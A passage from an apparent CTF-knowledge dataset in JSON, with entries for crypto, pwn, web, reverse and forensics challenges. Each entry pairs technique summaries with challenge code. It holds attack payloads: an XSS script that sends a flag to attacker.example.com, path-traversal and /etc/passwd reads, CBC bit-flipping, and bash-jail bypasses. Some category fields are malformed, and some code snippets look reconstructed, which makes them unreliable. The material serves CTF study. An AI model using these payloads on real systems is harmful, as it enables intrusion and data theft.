        "key": "```c++\n#define MAX_SIZE 64  \nchar password[64] = {};  \nconst char flag[MAX_SIZE] =\n\"\\x03\\x12\\x1A\\x17\\x0A\\xEC\\xF2\\x14\\x0E\\x05\\x03\\x1D\\x19\\x0E\\x02\\x0A\\x1F\\x07\\x0C\\x01\\x17\\x06\\x0C\\x0A\\x19\\x13\\x0A\\x16\\x1C\\x18\\x08\\x07\\x1A\\x03\\x1D\\x1C\\x11\\x0B\\xF3\\x87\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\";  \nint main()  \n{  \n for (int i = 0; i < MAX_SIZE; i++)  \n   password[i] = password[i] + 5;\n\n for (int i = 0; i < MAX_SIZE - 1; i++)  \n {  \n   char c_1 = password[i + 1];  \n   char c_0 = password[i];  \n   password[i] = c_0 ^ c_1;  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "IS_THIS_LCG_",
        "write_up": "dataset/raw/IS_THIS_LCG_.md",
        "type": "crypto",
        "competition": [
            "RCTF/2022",
            "https://ctftime.org/event/1806/tasks/"
        ],
        "score": -1.0,
        "max_score": 769,
        "difficulty": -1,
        "knowledge": [
            "To recover truncated LCG's internal state in cryptographic challenges where the LCG parameters and part of outputs are known, Closest Vector Problem (CVP) techniques can be effectively applied. The approach involves using an algorithm or mathematical technique designed to find vectors that are close to a given target vector within a lattice, where the lattice is constructed based on the known outputs and properties of the LCG. This method is applicable in scenarios where enough LCG output is partially revealed and can be employed to predict future outputs or revert the LCG to its initial state. \n    - Example of theoretical approach: Use of inequalities and modular constraints derived from LCG parameters and outputs to construct a lattice. Then, apply a CVP solver to find the closest vector to a target vector derived from partially known outputs.",
            "For challenges involving elliptic curve linear congruential generators (EC-LCG) where several x-coordinates of elliptic curve points are divulged, it's possible to compute the curve and subsequently solve for primes used in the encryption scheme. If at least seven initial values (x-coordinates) are known, the curve and its parameters can be computed. This technique involves constructing a matrix from the known x-coordinates, and then using the determinant of this matrix as it is a multiple of the prime of interest. This knowledge is principally used to break encryption schemes where EC-LCG is utilized to generate cryptographic primes.\n    - Example of application: Use of a matrix whose elements are functions of the known x-coordinates to compute the determinant. This determinant, in conjunction with the encryption scheme's modulus, can be used to recover the prime by calculating the Greatest Common Divisor (GCD) of the modulus and the determinant."
        ],
        "key": "```python  \ndef gen_p1():  \n   m = 2 ** 1024  \n   a = bytes_to_long(b'Welcome to RCTF 2022')  \n   b = bytes_to_long(b'IS_THIS_LCG?')  \n   x = getRandomInteger(1024)  \n   for i in range(8):  \n       x = (a * x + b) % m  \n       print('x{} = {}'.format(i, hex(x >> 850)))  \n   x = (a * x + b) % m  \n   return next_prime(x)  \n```\n\n```python  \ndef gen_p2():  \n   p = getStrongPrime(1024)  \n   A = getRandomRange(p//2, p)  \n   B = getRandomRange(p//2, p)  \n   assert (4*A**3+27*B**2) % p != 0  \n   E = EllipticCurve(GF(p), [A, B])  \n   a = 1  \n   b = E.random_element()  \n   x = E.random_element()  \n   for i in range(7):  \n       x = a*x + b  \n       print('x{} = {}'.format(i, hex(x[0])))  \n   return p  \n```\n\n```python  \ndef gen_p3():  \n   n, m = 8, next_prime(2^16)  \n   A, B, X = [random_matrix(Zmod(m), n, n) for _ in range(3)]  \n   for i in range(1337**1337):  \n       if i < 10:  \n           print('X{} = {}'.format(i, hex(mt2dec(X, n, m))))  \n       X = A*X + B  \n   return next_prime(mt2dec(X, n, m))  \n```"
    },
    {
        "name": "It's as easy as access=0000",
        "write_up": "dataset/raw/It's as easy as access=0000.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 300,
        "max_score": 700,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "In a challenge involving AES-CBC encrypted data, if the goal is to manipulate the plaintext without knowing the key, XOR operations can be performed on the Initialization Vector (IV) to flip specific bits in the first block of plaintext. This approach exploits the malleability of AES-CBC to alter the outcome of the decryption process to fulfill certain conditions. For instance, to change a portion of the decrypted plaintext from \"9999\" to \"0000\", one can XOR the bytes in the IV corresponding to the \"9999\" part in the plaintext with the XOR result of '9' and '0' (since X XOR X = 0 and 0 XOR Y = Y, flipping '9' to '0').\n\n    Example payload modification technique:\n\n    ```python\n    original_iv = iv[:position] + bytes([(iv[position] ^ ord('9') ^ ord('0'))]) + iv[position+1:]\n    ```",
            "The structural integrity of AES-CBC encrypted messages allows for message manipulation techniques such as bit flipping attack, which can be particularly useful in scenarios where the manipulation of access control tokens or other sensitive data fields is required to gain elevated privileges or access unauthorized information, as demonstrated in this CTF challenge. This technique requires no knowledge of the encryption key but a deep understanding of how CBC mode operates and the ability to manipulate the IV or ciphertext directly. This knowledge underpins a critical vulnerability in improperly implemented encryption schemes, emphasizing the need for secure IV handling and the validation of encrypted data before processing.\n\n    **No example payload is given for this point, as it primarily focuses on the theoretical understanding and application of the mentioned technique.**"
        ],
        "key": "```python  \nfrom Crypto.Util.Padding import pad, unpad  \nfrom Crypto.Cipher import AES  \nfrom Crypto.Random import get_random_bytes  \nfrom datetime import datetime, timedelta\n\nFLAG = \"ractf{XXX}\"  \nKEY = get_random_bytes(16)\n\ndef get_flag(token, iv):  \n   token = bytes.fromhex(token)  \n   iv = bytes.fromhex(iv)  \n   try:  \n       cipher = AES.new(KEY, AES.MODE_CBC, iv)  \n       decrypted = cipher.decrypt(token)  \n       unpadded = unpad(decrypted, 16)  \n   except ValueError as e:  \n       return {\"error\": str(e)}  \n   if b\"access=0000\" in unpadded:  \n       return {\"flag\": FLAG}  \n   else:  \n       return {\"error\": \"not authorized to read flag\"}\n\ndef generate_token():  \n   expires_at = (datetime.today() + timedelta(days=1)).strftime(\"%s\")  \n   token = f\"access=9999;expiry={expires_at}\".encode()  \n   iv = get_random_bytes(16)  \n   padded = pad(token, 16)  \n   cipher = AES.new(KEY, AES.MODE_CBC, iv)  \n   encrypted = cipher.encrypt(padded)  \n   ciphertext = iv.hex() + encrypted.hex()  \n   return {\"token\": ciphertext}\n\ndef start_challenge():  \n menu = \"Would you like to:\\n[1] Create a guest token\\n[2] Read the flag\"  \n while True:  \n   print(menu)  \n   choice = str(input(\"Your choice: \"))  \n   while choice != \"1\" and choice != \"2\":  \n       choice = str(input(\"Please enter a valid choice. Try again: \"))  \n   if choice == \"1\":  \n     print(generate_token())  \n   elif choice == \"2\":  \n     token = input(\"Please enter your admin token: \")  \n     while not token:  \n       token = input(\"Tokens can't be empty. Try again: \")  \n     iv = input(\"Please enter your token's initialization vector: \")  \n     while not iv:  \n       iv = input(\"Initialization vectors can't be empty. Try again: \")  \n     print(get_flag(token, iv))  \n  \nstart_challenge()  \n```"
    },
    {
        "name": "Ive got the same combination on my luggage",
        "write_up": "dataset/raw/Ive got the same combination on my luggage.md",
        "type": "pwn",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 205,
        "max_score": 1000,
        "difficulty": 0.205,
        "knowledge": [
            "When solving CTF challenges involving XOR encryption, it's crucial to understand the basic properties of XOR: Commutative (A \u2295 B = B \u2295 A), Associative (A \u2295 (B \u2295 C) = (A \u2295 B) \u2295 C), Identity (A \u2295 0 = A), and Self-Inverse (A \u2295 A = 0). This knowledge is instrumental in devising strategies to decrypt messages or reverse engineer encryption mechanisms by experimenting with known values and operations to isolate unknowns.",
            "For challenges where the encryption involves multiple XOR operations with different keys and the output is a concatenation of results, one can reverse the encryption by strategically applying XOR properties. Given hashes A, B, and C where A = plaintext \u2295 key1 \u2295 key2, B = plaintext \u2295 key1, and C = plaintext \u2295 key2, you can recover the plaintext by calculating B \u2295 C to get key1 \u2295 key2, then XOR this result with A. Applying this method allows for the decryption of the plaintext without directly needing to know the keys.\n   - Python sample to apply this method: \n     ```python\n     from pwn import xor\n     \n     with open(\"hash.txt\", \"r\") as file:  \n        hash = bytes.fromhex(file.read().strip())  \n        A, B, C = hash[:40], hash[40:80], hash[80:]\n        BC = xor(B, C)  \n        plaintext = xor(BC, A)  \n        print(plaintext.decode())\n     ```"
        ],
        "key": "```python\nfrom pwn import *\n\nplaintext = b'****************************************'  \nkey1 = b'****************************************'  \nkey2 = b'****************************************'\n\ndef shield_combination(p, k1, k2):  \n   A = xor(p, k1, k2)  \n   B = xor(p, k1)  \n   C = xor(p, k2)  \n   return A + B + C\n\nprint(shield_combination(plaintext, key1, key2).hex())  \n```"
    },
    {
        "name": "Izzy",
        "write_up": "dataset/raw/Izzy.md",
        "type": "reverse",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 68,
        "max_score": 500,
        "difficulty": 0.136,
        "knowledge": [
            "In reverse engineering challenges where encrypted data involves XOR operations with dynamically generated keys based on environmental variables or time, the decryption approach includes replicating the key generation logic. The decryption script should accurately regenerate keys by mimicking the original environment or conditions as closely as possible. In this scenario, the key was generated based on the current month and a predefined formula. The decryption script then XORs the generated keys with the hexadecimal encrypted data to produce the plaintext. This approach highlights the importance of understanding how encryption keys are derived to devise an effective decryption strategy.",
            "When dealing with reverse engineering tasks that output hexadecimal-encrypted files, converting hex to bytes before processing aids in the decryption process. This conversion allows for direct operations to be performed on the binary data, which can then be XORed with the generated keys to reveal the plaintext. The accurate conversion and handling of data types are critical for successful decryption in challenges where data manipulation is key. Example conversion in Python: `content = bytes.fromhex(content)`."
        ],
        "key": "```bash  \n#!/bin/bash  \nexport i=99; grep -o . <<< cat flag.txt| while read letter;  do i=$((i+1));\nprintf '%02x'  \"$(($(python3 -c \"import os;import decimal; import time;\ndecimal.getcontext().prec = 2992; index=int(os.environ.get('i')); x =\nstr(decimal.Decimal(1) / decimal.Decimal((1010 -\nint(time.strftime('%m')))*1000 +1))[2:]; print(int(x[3*index:3*index+3]))\") ^\n$(printf '%#x\\n' '\"'$letter)))\">>result.txt; done;  \n```"
    },
    {
        "name": "j0hnny_5",
        "write_up": "dataset/raw/j0hnny_5.md",
        "type": "This CTF challenge falls under the category of `forensics`.",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 999,
        "max_score": 1000,
        "difficulty": 0.999,
        "knowledge": [
            "When dealing with abstract UNIX domain sockets not bound to the filesystem, connecting can be done using scripting languages like Python. If the socket address is provided as a hexadecimal escape sequence (e.g., `\\x00?`), one must format the connection string correctly within the script to successfully establish a connection.  \n   Example snippet for Python:  \n   ```python\n   import socket\n   s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n   s.connect(\"\\x00?\")\n   ```",
            "Path traversal vulnerabilities can be exploited by manipulating input to access or interact with files outside the intended directory. When commands such as `show` or `upload` do not properly sanitize user input, it's possible to access directories or files outside of restricted paths using sequences like `../../`. This method can be used to reveal sensitive information or interact with unintended files.  \n   Example payload for exploiting path traversal to list the contents of the root directory:  \n   ```\n   > show ../../\n   ```"
        ],
        "key": "```python\ndef show_directory(path):\n    # Vulnerable to path traversal\n    if path.startswith(\"../../\"):\n        return list_directory(path)\n    else:\n        return \"Access Denied\"\n\ndef upload_file(path):\n    # Vulnerable to path traversal\n    if path.startswith(\"../../\"):\n        return \"Upload Fatal: Gibson server returned: error!\"\n    else:\n        return \"Upload succeeded\"\n```"
    },
    {
        "name": "JigBoy",
        "write_up": "dataset/raw/JigBoy.md",
        "type": "forensics",
        "competition": [
            "Mapna/2024",
            "https://ctftime.org/event/2205/tasks/"
        ],
        "score": 375,
        "max_score": 375,
        "difficulty": 1.0,
        "knowledge": [
            "When confronted with a forensics challenge involving a file with an unknown or `.damaged` extension, one initial step is to use a hex editor to examine the file's header bytes. Identifying the magic numbers (unique sequences that identify file formats) through this approach can lead to the determination of the file's actual type. If the magic number is unfamiliar, searching the bytes on the internet can provide insights into the correct file format, which is crucial for further analysis and repair. Example header for a `.jbg2` file: `97 4A 42 32 0D 0A 1A 0A`.",
            "After identifying and correcting the file header based on the file type specification, if the file still cannot be properly viewed or seems corrupted, further investigation into the file structure and comparison with a known good sample of the same file type might be necessary. This could involve analyzing and possibly correcting metadata such as the file size or specific format-related bytes. Copying specific file structure elements from a valid sample (such as size bytes or ending data markers) to replace potentially corrupted parts in the original file can resolve issues preventing the file from being opened or displayed correctly."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid processFile(const char *filename) {\n    FILE *file = fopen(filename, \"rb+\");\n    if (!file) {\n        printf(\"Error opening file.\\n\");\n        return;\n    }\n\n    unsigned char header[8];\n    fread(header, 1, 8, file);\n\n    // Check if the header is incorrect\n    if (header[0] != 0x97 || header[1] != 0x4A || header[2] != 0x42 || header[3] != 0x32) {\n        // Fix the header\n        header[0] = 0x97;\n        header[1] = 0x4A;\n        header[2] = 0x42;\n        header[3] = 0x32;\n        fseek(file, 0, SEEK_SET);\n        fwrite(header, 1, 8, file);\n    }\n\n    // Assume size bytes are at a specific position\n    fseek(file, 8, SEEK_SET);\n    unsigned char sizeBytes[16];\n    fread(sizeBytes, 1, 16, file);\n\n    // Fix the size bytes\n    unsigned char correctSizeBytes[16] = {0x00, 0x30, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x13};\n    memcpy(sizeBytes, correctSizeBytes, 16);\n    fseek(file, 8, SEEK_SET);\n    fwrite(sizeBytes, 1, 16, file);\n\n    fclose(file);\n}\n\nint main() {\n    processFile(\"damaged.jbg\");\n    return 0;\n}\n```"
    },
    {
        "name": "Jigsaw",
        "write_up": "dataset/raw/Jigsaw.md",
        "type": "reverse",
        "competition": [
            "OverTheWireAdventBonanza/2021",
            "https://ctftime.org/event/1503/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a large set of files, each potentially containing parts of encoded data (like base64 strings), examining the metadata, specifically timestamps, can be an effective strategy to determine the correct sequence for piecing together the data. This technique comes in handy when traditional methods fail, such as trying to algorithmically solve a puzzle based on the image content. It's crucial to consider all file attributes, as they might hold the key to solving the challenge.",
            "Utilizing command-line tools in a Unix-like environment (e.g., bash) for forensic analysis or data extraction can streamline the process significantly. For example, to extract, concatenate, and decode data embedded in file metadata (like EXIF comments) in a sequence determined by file modification times, one can employ a combination of `ls`, `exiftool`, `sed`, `xargs`, and `base64`. This approach is especially powerful when dealing with numerous files, allowing for an efficient and automated solution.\n\nExample command sequence to extract and decode base64 data sorted by modification time:\n```bash\nfor f in `ls -1rt`; do exiftool -Comment $f | sed -n \"s/.*'\\(.*\\)'/\\1/p\"; done | xargs | tr -d ' ' | base64 -d\n```"
        ],
        "key": "```python\nimport os\nimport base64\nfrom subprocess import check_output\n\ndef extract_secret(directory):\n    # Get list of files sorted by modification time\n    files = sorted(os.listdir(directory), key=lambda x: os.path.getmtime(os.path.join(directory, x)))\n    \n    secret_data = []\n    for f in files:\n        # Extract the comment from each file using exiftool\n        comment = check_output([\"exiftool\", \"-Comment\", os.path.join(directory, f)]).decode()\n        # Extract the secret data from the comment\n        secret = comment.split(\"'\")[1]\n        secret_data.append(secret)\n    \n    # Join all secret data and decode from base64\n    secret_string = ''.join(secret_data)\n    decoded_message = base64.b64decode(secret_string).decode()\n    \n    return decoded_message\n\n# Example usage\ndirectory = \"../jigsaw_pieces\"\nprint(extract_secret(directory))\n```"
    },
    {
        "name": "Jimmy's Crypto",
        "write_up": "dataset/raw/Jimmy's Crypto.md",
        "type": "crypto",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": 489,
        "max_score": 497,
        "difficulty": 0.9839034205231388,
        "knowledge": [
            "In challenges involving XOR encryption where the same key is used to encrypt multiple pieces of data, the ciphertexts can be XORed together to cancel out the key. This results in the XOR of the original plaintexts, which can then be analyzed to extract information or recover the plaintexts.\n   \n   Example application: If `ciphertext1 = plaintext1 XOR key` and `ciphertext2 = plaintext2 XOR key`, then `ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2`.\n   \n   Sample Payload: N/A due to the conceptual nature of this technique.",
            "When dealing with XORed texts where one is known to be in readable English, guessing common substrings or formats in the unknown plaintext (like the format of a CTF flag, e.g., \"CTF{...}\") can be a viable technique to recover messages. This method relies on predictable structure or content within one of the plaintext messages to guess parts of the XOR key or the plaintext directly.\n\n   Condition: Useful when at least one of the plaintexts is suspected to contain commonly occurring strings or formats and the XOR of the plaintexts has been obtained.\n\n   Example Payload: Assuming `x = plaintext1 XOR plaintext2`, trying `x XOR 'knownStringFormat'` at different positions can reveal parts of the plaintext or the entire message if the guess is correct and positioned accurately."
        ],
        "key": "```python\nimport os\n\ndef xor_data(data, key):\n    return bytes(a ^ b for a, b in zip(data, key))\n\ndef generate_key(length):\n    return os.urandom(length)\n\ndef encrypt_flag_and_secret(flag, secret):\n    key = generate_key(len(flag))\n    encrypted_flag = xor_data(flag, key)\n    encrypted_secret = xor_data(secret, key)\n    return encrypted_flag, encrypted_secret\n\nflag = b'TUCTF{D0NT_US3_TH3_S4M3_K3Y_F0R_TH3_S4M3_M3SS4G3}'\nsecret = b'steal my secrets. If you are looking at this file,'\nencrypted_flag, encrypted_secret = encrypt_flag_and_secret(flag, secret)\n\nwith open('flag', 'wb') as f:\n    f.write(encrypted_flag)\n\nwith open('secret', 'wb') as f:\n    f.write(encrypted_secret)\n```"
    },
    {
        "name": "Journey_ Chapter I",
        "write_up": "dataset/raw/Journey_ Chapter I.md",
        "type": "crypto",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In web challenges where session contents are stored server-side and cannot be directly manipulated due to server-side validation or encryption, an alternative approach to gain administrative access or sensitive information is through Cross-Site Scripting (XSS) vulnerabilities. This method involves injecting malicious JavaScript code into a webpage viewed by other users or administrators, triggering actions on their behalf.",
            "When the application uses shared databases between different features (like WebAuthn and a custom feature in the example), it's possible to exploit the system by crafting inputs that are accepted by one feature and then maliciously interpreted by another. Specifically, manipulating the input to control object properties or keys used in database operations can lead to unauthorized access or execution of actions, such as injecting a script that performs actions on behalf of an administrator.   \nExample payload:  \n```python\nfrom random import randint  \nimport requests as rq\n\nURL = \"http://journey.ctf.example.com\"  \nID = 'exploit' + str(randint(0, 10**9))\n\npayload = '<script>fetch(\"/get_admin\", {method:\"GET\",credentials:\"include\"}).then(response => response.text()).then(flag => window.location=\"http://attacker.example.com/log?\"+flag);</script>'\n\nchallenge = rq.post(URL+\"/webauthn/register\",  \n   json={  \n       'name': 'fav_' + ID,  \n       'displayName': payload  \n   }).json()\n\nreport = rq.get(URL+\"/report\",  \n   params={  \n       'url': URL+\"/favorites?type=displayName&favId=\"+ID,  \n   })  \n```"
        ],
        "key": "```javascript\napp.get('/favorites', async function (req, res) {  \n   const { favId, type } = req.query  \n   const obj = await db.get(`fav_${favId}`)  \n   if (obj && type in obj)  \n       res.send(obj[type])  \n   else  \n       res.send({ err: 'not found' })  \n});\n```"
    },
    {
        "name": "jsss",
        "write_up": "dataset/raw/jsss.md",
        "type": "web",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 953,
        "max_score": 953,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting JavaScript sandbox environments, if direct invocation of functions is restricted (e.g., by filtering specific characters like the opening parenthesis `(`), consider using tagged template literals as an alternative method to execute functions without the need for parentheses. This technique is applicable in situations where the environment allows for template literal syntax and can be particularly useful for bypassing character filters or restrictions within sandboxed code execution contexts.\n   - Example payload: `console.log\\`1\\``, `getFlag\\`\\``, `readFile\\`/etc/passwd\\``",
            "In scenarios where accessing a file directly is prevented by application logic (e.g., restrictions on accessing files with \"flag\" in the path), use the Linux `/proc` filesystem to interact with file descriptors of a process. This approach relies on understanding how the `/proc` filesystem represents process information, including opened file descriptors, which can be accessed indirectly to read files that are otherwise restricted.\n   - For creating file descriptors to a restricted file (e.g., `/flag.txt`), use recursive function calls or repeated attempts to open the restricted file, generating file descriptors in `/proc/self/fd`.\n   - To read the contents indirectly, iterate over possible file descriptor numbers, attempting to read from paths such as `/proc/self/fd/0`, `/proc/self/fd/1`, etc., until the desired file's contents are obtained. This technique is effective when direct file access is denied but the underlying system actions (such as opening files) still occur, thus leaving a trace in the `/proc` filesystem that can be exploited.\n   - Example payload (to keep trying to read `/flag.txt` and create file descriptors): `a = _=> { return readFile\\`/flag.txt\\` + readFile\\`/flag.txt\\` + a\\`\\` }, a\\`\\``\n   - Example payload (to iterate through file descriptors and attempt to read the resources they point to): `readFile\\`/proc/self/fd/0\\`, readFile\\`/proc/self/fd/1\\`, ..., readFile\\`/proc/self/fd/n\\``"
        ],
        "key": "```javascript\nlet order = req.cookies.order  \n...  \nreq.userOrder = order  \n\nif(req.userUid == -1 || !req.userOrder)  \n\treturn res.json({ error: true, msg: \"Login first\" })  \n\nif(parseInt(req.userUid) != 0 || req.userOrder.includes(\"(\"))  \n\treturn res.json({ error: true, msg: \"You can't do this sorry\" })  \n\nreq.userUid = -1  \nreq.userOrder = \"\"\n\nlet order = req.cookies.order  \nlet uid = req.cookies.uid  \nlet passwd = req.cookies.passwd\n\nif(uid == undefined || passwd == undefined)  \n\treturn next()\n\nlet found = false  \nfor(let e of users.entries())  \n\tif(e[0].uid == uid && e[0].password == passwd) // Our uid is being checked here  \n\t\tfound = true\n\nif(found){  \n\treq.userUid = uid  \n\treq.userOrder = order  \n}\n\nnext()  \n\nresult = new String(vm.run(`sum([${req.userOrder}])`))  \n\nreadFile: (path)=>{  \n\tpath = new String(path).toString()  \n\tif(fs.statSync(path).size == 0)  \n\t\treturn null  \n\tlet r = fs.readFileSync(path)  \n\tif(!path.includes('flag'))  \n\t\treturn r  \n\treturn null  \n},  \nsum: (args)=>args.reduce((a,b)=>a+b),  \ngetFlag: _=>{  \n\t// return flag  \n\treturn secretMessage  \n}  \n```"
    },
    {
        "name": "Juggle",
        "write_up": "dataset/raw/Juggle.md",
        "type": "This write-up describes the \"Juggle\" CTF challenge. Based on the provided information, the challenge type is **reverse**.",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 90,
        "max_score": 500,
        "difficulty": 0.18,
        "knowledge": [
            "In a challenge involving XML and XSLT, where the task is to manipulate data within specific conditions (e.g., limiting the number or type of elements), carefully examine the logical structures and conditions outlined in the XSLT file. This may include interpreting custom logic encoded via recursion, and assertions that halt processing under certain conditions. This analysis can reveal the framework for constructing a valid XML payload that manipulates the application logic as intended.",
            "When faced with a challenge that simulates a virtual machine using XML and XSLT, instructions within the XSLT can denote operations such as pushing to a stack, conditional jumps, and arithmetic operations. Developing an understanding of how these operations can be composed to implement complex logic (e.g., binary search) or specific algorithms is crucial. This might involve translating high-level concepts into a sequence of XML-formatted instructions, potentially creating or using tools like assemblers or emulators for debugging and verification. A sample of implementing binary search with XML instructions could be conceptual but resembles assembling a list of `<plate>` operations corresponding to assembly commands (specific payload cannot be generated due to the abstract nature of the example)."
        ],
        "key": "```xml\n<xsl:if test=\"count(//plate) > 300\">  \n <xsl:message terminate=\"yes\">You do not have enough money to buy that much food</xsl:message>  \n</xsl:if>  \n\n<xsl:variable name=\"chef-drinks\">  \n <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>  \n <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>  \n <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>  \n <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>  \n <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>  \n</xsl:variable>  \n\n<xsl:call-template name=\"consume-meal\">  \n <xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/>  \n <xsl:with-param name=\"food-eaten\" select=\"1\"/>  \n <xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/>  \n <xsl:with-param name=\"drinks\" select=\"state/drinks\"/>  \n</xsl:call-template>  \n\n<xsl:if test=\"$food-eaten > 30000\">  \n <xsl:message terminate=\"yes\">You ate too much and died</xsl:message>  \n</xsl:if>  \n<xsl:if test=\"count($drinks) > 200\">  \n <xsl:message terminate=\"yes\">You cannot drink that much</xsl:message>  \n</xsl:if>  \n\n<xsl:if test=\"count($course) > 0\">  \n <xsl:variable name=\"c\" select=\"$course[1]\"/>  \n <xsl:variable name=\"r\" select=\"$course[position()>1]\"/>  \n <xsl:choose>  \n   <xsl:when test=\"count($c/paella) = 1\">  \n     <xsl:variable name=\"newdrinks\">  \n       <value>  \n         <xsl:value-of select=\"$c/paella + 0\"/>  \n       </value>  \n       <xsl:copy-of select=\"$drinks\"/>  \n     </xsl:variable>  \n     <xsl:call-template name=\"consume-meal\">  \n       <xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/>  \n       <xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/>  \n       <xsl:with-param name=\"course\" select=\"$r\"/>  \n       <xsl:with-param name=\"drinks\" select=\"exsl:node-set($newdrinks)//value\"/>  \n     </xsl:call-template>  \n   </xsl:when>  \n   <!-- Other cases omitted for brevity -->\n </xsl:choose>  \n</xsl:if>  \n```"
    },
    {
        "name": "Junior CTF - babybash",
        "write_up": "dataset/raw/Junior CTF - babybash.md",
        "type": "The type of this CTF challenge is: `misc`",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 47,
        "max_score": 477,
        "difficulty": 0.09853249475890985,
        "knowledge": [
            "In challenges involving restricted command execution environments, such as bash jails where specific characters or commands are disallowed, one can utilize environment variables and their substrings to bypass restrictions and execute commands. This is possible because bash allows substring extraction from environment variables using the syntax `${VARIABLE_NAME:POSITION:LENGTH}`. Focus on using stable environment variables that are less likely to change between sessions, such as `OSTYPE`, `HOSTNAME`, `PATH`, or `HOME`.",
            "When a command requires additional arguments that are difficult to generate due to character restrictions, consider capturing the command's output that includes the correct syntax or necessary arguments to a file. Then, execute the desired command with arguments by extracting and running the saved output directly from the file. This method avoids the need to find new characters to bypass restrictions and can be particularly useful in tight constraints. Example payload to write output to a file and execute required command with arguments:\n```\n/get/flag > BAR\n# writes \"/get_flag: /get_flag gimme_FLAG_please\" to file BAR\n$(cat BAR | cut -d  -f 2,3)\n# executes \"/get_flag gimme_FLAG_please\" by cutting the relevant part from the file and running it\n```"
        ],
        "key": "```bash\n/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}${HOSTNAME:10:1}${OSTYPE:6:1}\n>BAR\n\n$( ${HOSTNAME:5:1}${HOSTNAME:10:1}${HOME:1:1} BAR | ${HOSTNAME:5:1}${PATH:1:1}${HOME:1:1} -${HOSTNAME:7:1}\" \"  -${HOSTNAME:9:1} 2,3)\n```"
    },
    {
        "name": "Junior CTF - top",
        "write_up": "dataset/raw/Junior CTF - top.md",
        "type": "crypto",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 49,
        "max_score": 477,
        "difficulty": 0.10272536687631027,
        "knowledge": [
            "If an encryption algorithm uses the current time as a seed for its random number generator, it is possible to regenerate the encryption key by determining the exact timestamp used. This is feasible because the `random` package in Python produces the same sequence of numbers for the same seed value. In scenarios where the encrypted data includes the timestamp (either in whole or partly in a predictable format), one can extract the timestamp, use it as a seed in the `random` function, and re-generate the key.",
            "When dealing with encrypted data where a known value is XORed with a part of the encryption, you can reverse-engineer this part of the encryption by applying XOR again with the known value. In the context where a fixed byte sequence (e.g., 0x88 repeated) is used, XORing the encrypted portion corresponding to the known value with the same byte sequence unveils the original data. This technique is particularly useful when you know the format or specific characteristics (such as length) of the original data that was encrypted alongside the unknown data (for example, using known plaintext attacks in cryptanalysis). \n\nExample payload based on the provided write-up for reversing the encrypted timestamp part:\n```python\nencr_time = str(msg.read())[-14:] # Assuming last 14 chars are the encrypted timestamp\ndecrypted_time = [chr(ord(m) ^ 0x88) for (m, _) in zip(encr_time, [0x88]*len(encr_time))]\nprint(''.join(decrypted_time))\n```"
        ],
        "key": "```python\nimport random\nimport time\n\ndef encrypt(msg):\n    cur_time = str(time.time()).encode('ASCII')\n    random.seed(cur_time)\n    key = [random.randrange(256) for _ in msg]\n    c = [m ^ k for (m, k) in zip(msg, key)]\n    return c + [m ^ 0x88 for m in cur_time]\n\n# Example usage\nmsg = b\"secret_flag\"\nencrypted = encrypt(msg)\nprint(encrypted)\n```"
    },
    {
        "name": "junior-jwt",
        "write_up": "dataset/raw/junior-jwt.md",
        "type": "web",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 131,
        "max_score": 500,
        "difficulty": 0.262,
        "knowledge": [
            "When attempting to exploit JWT (JSON Web Token) vulnerabilities, especially in custom implementations, changing the signing algorithm to a symmetric one (like `HS256`) and signing the token with a known key (such as the public key when it is mistakenly used for verification in symmetric contexts) can bypass authentication restrictions. This is applicable when the server code does not enforce the algorithm used for signing, allowing the client to dictate it. This technique is particularly effective in scenarios where the server is designed to use asymmetric keys (public/private) for token verification but does not adequately enforce the algorithm, thus allowing an attacker to exploit this oversight by using a symmetric algorithm with a known public key for signing.",
